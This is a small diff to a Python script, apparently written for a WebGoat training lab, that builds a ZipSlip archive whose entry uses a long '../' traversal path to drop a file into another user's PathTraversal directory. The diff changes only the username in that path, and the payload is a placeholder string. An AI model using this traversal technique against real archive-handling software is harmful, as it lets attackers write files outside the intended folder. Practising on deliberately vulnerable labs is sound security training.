@@ -8,7 +8,7 @@ s = ZipProvider.create(archive_name)
 malicious_content = b'Your malicious content goes here'
 
 # Define the path inside the ZIP archive to exploit ZipSlip
-exploit_path = '../../../../../../../../../home/webgoat/.webgoat-2023.4/PathTraversal/ecschoye/ecschoye.jpg'
+exploit_path = '../../../../../../../../../home/webgoat/.webgoat-2023.4/PathTraversal/admin123/admin123.jpg'
 
 # Add the malicious content to the ZIP archive with the exploit path
 s.append_blob(malicious_content, exploit_path)
